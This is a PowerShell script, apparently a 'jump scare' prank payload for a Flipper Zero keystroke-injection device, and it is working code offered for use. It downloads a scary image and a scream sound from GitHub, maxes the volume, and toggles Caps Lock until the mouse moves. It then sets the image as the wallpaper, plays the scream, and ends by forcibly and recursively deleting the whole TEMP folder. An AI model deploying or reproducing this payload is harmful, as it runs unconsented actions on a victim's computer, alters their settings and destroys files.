# Download Image
$imageUrl = "https://raw.githubusercontent.com/Ta0hit/FlipperZero/main/RubberDucky%20JumpScare/jumpscare.png"
iwr $imageUrl -OutFile "$env:TMP\i.png"

# Download WAV file
$wavUrl = "https://raw.githubusercontent.com/Ta0hit/FlipperZero/main/RubberDucky%20JumpScare/creepy_scream.wav"
iwr $wavUrl -OutFile "$env:TMP\s.wav"

# Set Wallpaper Function
Function Set-WallPaper {
    param (
        [string]$Image,
        [string]$Style
    )
    
    $WallpaperStyle = Switch ($Style) {
        "Fill" {"10"}
        "Fit" {"6"}
        "Stretch" {"2"}
        "Tile" {"0"}
        "Center" {"0"}
        "Span" {"22"}
    }
    
    If($Style -eq "Tile") {
        New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
        New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 1 -Force
    }
    Else {
        New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
        New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 0 -Force
    }
    
    if (-not ([System.Management.Automation.PSTypeName]'Params').Type) {
        Add-Type -TypeDefinition @"
        using System; 
        using System.Runtime.InteropServices;
        
        public class Params
        { 
            [DllImport("User32.dll",CharSet=CharSet.Unicode)] 
            public static extern int SystemParametersInfo (Int32 uAction, 
                                                           Int32 uParam, 
                                                           String lpvParam, 
                                                           Int32 fuWinIni);
        }
        "@
    }
    
    $SPI_SETDESKWALLPAPER = 0x0014
    $UpdateIniFile = 0x01
    $SendChangeEvent = 0x02
    $fWinIni = $UpdateIniFile -bor $SendChangeEvent
    
    $ret = [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $fWinIni)
}

# Pause Until Mouse Movement
function Pause-Script{
    Add-Type -AssemblyName System.Windows.Forms
    $originalPOS = [System.Windows.Forms.Cursor]::Position.X
    $o=New-Object -ComObject WScript.Shell

    while (1) {
        $pauseTime = 3
        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
            break
        } else {
            $o.SendKeys("{CAPSLOCK}"); Start-Sleep -Seconds $pauseTime
        }
    }
}

# Play WAV Function
function Play-WAV {
    $wavFile = "$env:TMP\s.wav"
    
    if (Test-Path $wavFile) {
        try {
            $PlayWav = New-Object System.Media.SoundPlayer
            $PlayWav.SoundLocation = $wavFile
            $PlayWav.PlaySync()
        } catch {
            Write-Host "Error playing WAV file: $($_.Exception.Message)"
        }
    } else {
        Write-Host "WAV file not found at $wavFile"
    }
}

# Turn volume to max
$k = [Math]::Ceiling(100/2); $o = New-Object -ComObject WScript.Shell; for($i = 0;$i -lt $k;$i++){$o.SendKeys([char] 175)}

# Pause script until mouse movement
Pause-Script

# Set the wallpaper if the image exists
if (Test-Path "$env:TMP\i.png") {
    Set-WallPaper -Image "$env:TMP\i.png" -Style Center
} else {
    Write-Host "Image file not found."
}

# Play the sound
Play-WAV

# Clean up temporary files
rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
